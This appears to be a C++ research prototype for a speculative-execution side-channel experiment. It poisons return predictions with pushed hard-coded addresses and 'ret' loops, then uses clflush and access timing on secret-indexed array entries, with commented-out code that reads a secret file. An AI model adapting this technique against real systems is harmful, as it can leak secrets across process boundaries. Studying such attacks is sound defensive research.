#include "util.hpp"
#include <iostream>
#include <fstream>
#include <unistd.h>
#include <sched.h>
#define secret 1232
#define secret2 13427
#define nonsecret 21142

using namespace std;

char array[256*256];
int total = 0, total2 = 0;

volatile int foo(){
	return 0;
}

inline void timeAndFlush(ADDR_PTR addr) {
	printAccessTime(addr);
	// clflush((void *)addr);
}

volatile void spacer2() {
	asm(
		".rept 915;"
		"nop;"
		".endr;"
	);
}

void trickMe() {
	// while(1) {
	ADDR_PTR address, tmp;

	for (int i = 0; i < 10000; i++) {
		sched_yield();
		asm(
			"mov $0x0000555555554c74,%0;" "push %0;"
			"mov $0x0000555555554c73,%0;" "push %0;"
			"mov $0x0000555555554c72,%0;" "push %0;"
			"mov $0x0000555555554c71,%0;" "push %0;"
			"mov $0x0000555555554c70,%0;" "push %0;"
			"mov $0x0000555555554c6f,%0;" "push %0;"
			"mov $0x0000555555554c6e,%0;" "push %0;"
			"mov $0x0000555555554c6d,%0;" "push %0;"
			"mov $0x0000555555554c6c,%0;" "push %0;"
			"mov $0x0000555555554c6b,%0;" "push %0;"
			"mov $0x0000555555554c6a,%0;" "push %0;"
			"mov $0x0000555555554c69,%0;" "push %0;"
			"mov $0x0000555555554c68,%0;" "push %0;"
			"mov $0x0000555555554c67,%0;" "push %0;"
			"mov $0x0000555555554c66,%0;" "push %0;"
			"mov $0x0000555555554c65,%0;" "push %0;"
			".rept 16;"
			"ret;"
			".endr;"
			: "=r" (tmp)
			: "r" (address)
		);
	
		// timeAndFlush((ADDR_PTR)&array[secret]);
		total += measure_one_block_access_time((ADDR_PTR)&array[secret]);
		total2 += measure_one_block_access_time((ADDR_PTR)&array[secret2]);
		clflush((void *)&array[secret]);
		clflush((void *)&array[secret2]);
	}
}

volatile void spacer() {
	asm(
		// ".rept 1000;"
		".rept 957;"
		"nop;"
		".endr;"
	);
}

void exploit1() { // this should be at the same VA as attacker:gadget()
	volatile int temp = array[secret];
}

void exploit2() { // this should be at the same VA as attacker:gadget()
	volatile int temp = array[secret2];
}

int main(){
	clflush(&array[secret]);
	clflush(&array[nonsecret]);

	trickMe();

	printf("avg time for secret1 is %f\n", total/10000.0);
	printf("avg time for secret2 is %f\n", total2/10000.0);
	// printf("diff avg time is %f\n", total2/1000.0 - total/1000.0);

	// for(int i = 0; i < 10000; i++) {
	// 	printf("%u\n", times[i]);
	// }

	// string buffer;
	// char temp;
	// volatile int i = 0;

	// ifstream secretFile("secret");
	// if(secretFile.is_open()){
	// 	getline(secretFile, buffer);
	// 	secretFile.close();
	// }

	// string secret = buffer;
	// temp &= array[secret[i]*256]; // vulneralbility

	// while(true){
	// 	foo();
	// 	measureAccessTime();
	// }

	return 0;
}